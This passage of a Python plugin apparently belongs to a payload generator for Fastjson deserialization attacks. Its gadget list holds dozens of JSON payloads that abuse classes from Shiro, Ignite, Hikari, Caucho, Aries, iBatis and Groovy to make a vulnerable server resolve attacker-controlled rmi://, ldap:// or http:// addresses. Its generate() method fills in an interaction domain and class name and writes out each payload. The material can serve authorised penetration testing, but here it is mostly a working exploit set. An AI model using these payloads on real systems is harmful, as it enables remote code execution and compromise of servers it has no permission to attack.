            'name': 'fastjson-jndiconfiguration-rmi-1.2.5-1.2.60',
            'description': 'Fastjson JNDIConfiguration RMI 1.2.5 <= 1.2.60',
            'output': 'json',
            'payload': '{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-jndiconfiguration-ldap-1.2.5-1.2.60',
            'name': 'fastjson-jndiconfiguration-ldap-1.2.5-1.2.60',
            'description': 'Fastjson JNDIConfiguration LDAP 1.2.5 <= 1.2.60',
            'output': 'json',
            'payload': '{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-jndiconverter-ldap-1.2.62',
            'name': 'fastjson-jndiconverter-ldap-1.2.62',
            'description': 'Fastjson JndiConverter LDAP < 1.2.62',
            'output': 'json',
            'payload': '{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-jndiconverter-ldap-1.2.62',
            'name': 'fastjson-jndiconverter-ldap-1.2.62',
            'description': 'Fastjson JndiConverter LDAP < 1.2.62',
            'output': 'json',
            'payload': '{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-jmscontentinterceptor-ldap-1.2.62',
            'name': 'fastjson-jmscontentinterceptor-ldap-1.2.62',
            'description': 'Fastjson JMSContentInterceptor LDAP < 1.2.62',
            'output': 'json',
            'payload': '{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"rmi://<domain>/<className>"}, "namespace":""}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-jmscontentinterceptor-ldap-1.2.62',
            'name': 'fastjson-jmscontentinterceptor-ldap-1.2.62',
            'description': 'Fastjson JMSContentInterceptor LDAP < 1.2.62',
            'output': 'json',
            'payload': '{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://<domain>/<className>"}, "namespace":""}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndiobjectfactory-rmi-1.2.66',
            'name': 'fastjson-shiro-jndiobjectfactory-rmi-1.2.66',
            'description': 'Fastjson Shiro JndiObjectFactory RMI <= 1.2.66',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndiobjectfactory-ldap-1.2.66',
            'name': 'fastjson-shiro-jndiobjectfactory-ldap-1.2.66',
            'description': 'Fastjson Shiro JndiObjectFactory LDAP <= 1.2.66',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndirealmfactory-rmi-1.2.66',
            'name': 'fastjson-shiro-jndirealmfactory-rmi-1.2.66',
            'description': 'Fastjson Shiro JndiRealmFactory RMI <= 1.2.66',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["rmi://<domain>/<className>"], "Realms":[""]}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndirealmfactory-ldap-1.2.66',
            'name': 'fastjson-shiro-jndirealmfactory-ldap-1.2.66',
            'description': 'Fastjson Shiro JndiRealmFactory LDAP <= 1.2.66',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://<domain>/<className>"], "Realms":[""]}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-anteros-anterosdbcpconfig-rmi-1.2.66-1',
            'name': 'fastjson-anteros-anterosdbcpconfig-rmi-1.2.66-1',
            'description': 'Fastjson Anteros AnterosDBCPConfig RMI <= 1.2.66 (1)',
            'output': 'json',
            'payload': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-anteros-anterosdbcpconfig-ldap-1.2.66-1',
            'name': 'fastjson-anteros-anterosdbcpconfig-ldap-1.2.66-1',
            'description': 'Fastjson Anteros AnterosDBCPConfig LDAP <= 1.2.66 (1)',
            'output': 'json',
            'payload': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-anteros-anterosdbcpconfig-rmi-1.2.66-2',
            'name': 'fastjson-anteros-anterosdbcpconfig-rmi-1.2.66-2',
            'description': 'Fastjson Anteros AnterosDBCPConfig RMI <= 1.2.66 (2)',
            'output': 'json',
            'payload': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-anteros-anterosdbcpconfig-ldap-1.2.66-2',
            'name': 'fastjson-anteros-anterosdbcpconfig-ldap-1.2.66-2',
            'description': 'Fastjson Anteros AnterosDBCPConfig LDAP <= 1.2.66 (2)',
            'output': 'json',
            'payload': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-ignite-cachejnditmlookup-rmi-1.2.66',
            'name': 'fastjson-ignite-cachejnditmlookup-rmi-1.2.66',
            'description': 'Fastjson Ignite CacheJndiTmLookup RMI <= 1.2.66',
            'output': 'json',
            'payload': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-ignite-cachejnditmlookup-ldap-1.2.66',
            'name': 'fastjson-ignite-cachejnditmlookup-ldap-1.2.66',
            'description': 'Fastjson Ignite CacheJndiTmLookup LDAP <= 1.2.66',
            'output': 'json',
            'payload': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-sqlmap-jtatransactionconfig-rmi-1.2.66',
            'name': 'fastjson-sqlmap-jtatransactionconfig-rmi-1.2.66',
            'description': 'Fastjson SQLmap JtaTransactionConfig RMI <= 1.2.66',
            'output': 'json',
            'payload': '{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"rmi://<domain>/<className>"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-sqlmap-jtatransactionconfig-ldap-1.2.66',
            'name': 'fastjson-sqlmap-jtatransactionconfig-ldap-1.2.66',
            'description': 'Fastjson SQLmap JtaTransactionConfig LDAP <= 1.2.66',
            'output': 'json',
            'payload': '{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://<domain>/<className>"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-ignite-cachejnditmlookup-rmi-1.2.67',
            'name': 'fastjson-ignite-cachejnditmlookup-rmi-1.2.67',
            'description': 'Fastjson Ignite CacheJndiTmLookup RMI <= 1.2.67',
            'output': 'json',
            'payload': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["rmi://<domain>/<className>"], "tm": {"$ref":"$.tm"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-ignite-cachejnditmlookup-ldap-1.2.67',
            'name': 'fastjson-ignite-cachejnditmlookup-ldap-1.2.67',
            'description': 'Fastjson Ignite CacheJndiTmLookup LDAP <= 1.2.67',
            'output': 'json',
            'payload': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://<domain>/<className>"], "tm": {"$ref":"$.tm"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndiobjectfactory-rmi-1.2.67',
            'name': 'fastjson-shiro-jndiobjectfactory-rmi-1.2.67',
            'description': 'Fastjson Shiro JndiObjectFactory RMI <= 1.2.67',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"rmi://<domain>/<className>","instance":{"$ref":"$.instance"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndiobjectfactory-ldap-1.2.67',
            'name': 'fastjson-shiro-jndiobjectfactory-ldap-1.2.67',
            'description': 'Fastjson Shiro JndiObjectFactory LDAP <= 1.2.67',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://<domain>/<className>","instance":{"$ref":"$.instance"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-hadoop-hikariconfig-rmi-1.2.68-1',
            'name': 'fastjson-hadoop-hikariconfig-rmi-1.2.68-1',
            'description': 'Fastjson Hadoop HikariConfig RMI <= 1.2.68 (1)',
            'output': 'json',
            'payload': '{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-hadoop-hikariconfig-ldap-1.2.68-1',
            'name': 'fastjson-hadoop-hikariconfig-ldap-1.2.68-1',
            'description': 'Fastjson Hadoop HikariConfig LDAP <= 1.2.68 (1)',
            'output': 'json',
            'payload': '{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-hadoop-hikariconfig-rmi-1.2.68-2',
            'name': 'fastjson-hadoop-hikariconfig-rmi-1.2.68-2',
            'description': 'Fastjson Hadoop HikariConfig RMI <= 1.2.68 (2)',
            'output': 'json',
            'payload': '{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-hadoop-hikariconfig-ldap-1.2.68-2',
            'name': 'fastjson-hadoop-hikariconfig-ldap-1.2.68-2',
            'description': 'Fastjson Hadoop HikariConfig LDAP <= 1.2.68 (2)',
            'output': 'json',
            'payload': '{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-caucho-resourceref-rmi-1.2.68',
            'name': 'fastjson-caucho-resourceref-rmi-1.2.68',
            'description': 'Fastjson Caucho ResourceRef RMI <= 1.2.68',
            'output': 'json',
            'payload': '{"@type":"com.caucho.config.types.ResourceRef","lookupName": "rmi://<domain>/<className>", "value": {"$ref":"$.value"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-caucho-resourceref-ldap-1.2.68',
            'name': 'fastjson-caucho-resourceref-ldap-1.2.68',
            'description': 'Fastjson Caucho ResourceRef LDAP <= 1.2.68',
            'output': 'json',
            'payload': '{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://<domain>/<className>", "value": {"$ref":"$.value"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-aries-recoverablepooledconnectionfactory-rmi',
            'name': 'fastjson-aries-recoverablepooledconnectionfactory-rmi',
            'description': 'Fastjson Aries RecoverablePooledConnectionFactory RMI <= ?',
            'output': 'json',
            'payload': '{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "rmi://<domain>/<className>", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-aries-recoverablepooledconnectionfactory-ldap',
            'name': 'fastjson-aries-recoverablepooledconnectionfactory-ldap',
            'description': 'Fastjson Aries RecoverablePooledConnectionFactory LDAP <= ?',
            'output': 'json',
            'payload': '{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://<domain>/<className>", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-aries-xapooledconnectionfactory-rmi',
            'name': 'fastjson-aries-xapooledconnectionfactory-rmi',
            'description': 'Fastjson Aries XaPooledConnectionFactory RMI <= ?',
            'output': 'json',
            'payload': '{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "rmi://<domain>/<className>", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-aries-xapooledconnectionfactory-ldap',
            'name': 'fastjson-aries-xapooledconnectionfactory-ldap',
            'description': 'Fastjson Aries XaPooledConnectionFactory LDAP <= ?',
            'output': 'json',
            'payload': '{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://<domain>/<className>", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-groovy-http-1.2.76-1.2.83',
            'name': 'fastjson-groovy-http-1.2.76-1.2.83',
            'description': 'Fastjson Groovy HTTP 1.2.76 <= v < 1.2.83',
            'output': 'json',
            'payload': '{"@type":"org.codehaus.groovy.control.ProcessingUnit","@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit","config":{"@type":"org.codehaus.groovy.control.CompilerConfiguration","classpathList":["http://<domain>"]},"gcl":null,"destDir":"/tmp"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        }
    ]

    def __init__(self, chainOpts):
        super().__init__('', chainOpts)
        
    def exists(self):
        return True
    
    def payload(self, chainName, chainArgs):
        return self.gadgets[chainName]
    
    def chains(self):
        return self.gadgets

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        interact_domain = self.chainOpts.interact_domain
        remote_file_to_read = "/etc/hosts" if self.chainOpts.remote_file_to_read is None else self.chainOpts.remote_file_to_read
    
        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"Remote file to read: {remote_file_to_read}")

        logging.info(f"Generating payloads...")
        count = 0
        for chain in chains:

            if self.chainOpts.format != None and self.chainOpts.format != chain['output']:
                logging.debug(f"[{chain['name']}] Skipping chain of format '{chain['output']}'")
                continue

            if chain['unsafe'] and not self.chainOpts.unsafe:
                logging.debug(f"[{chain['name']}] Skipping unsafe chain")
                continue
            
            logging.info(f"[{chain['name']}] Generating payload '{chain['description']}'")

            chainUniqueId = chain['id']

            payload = chain['payload']
            payload = payload.replace('<domain>', f"{chain['id']}.{interact_domain}")
            payload = payload.replace('<remote_file_to_read>', f"{remote_file_to_read}")
            payload = payload.replace('<className>', f"{chain['id']}")
            payload = payload.encode('utf-8')
            
            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

            payload = self.encode(payload)

            self.output(chainUniqueId, payload+b"\n")

            count = count + 1    
            
            
        return count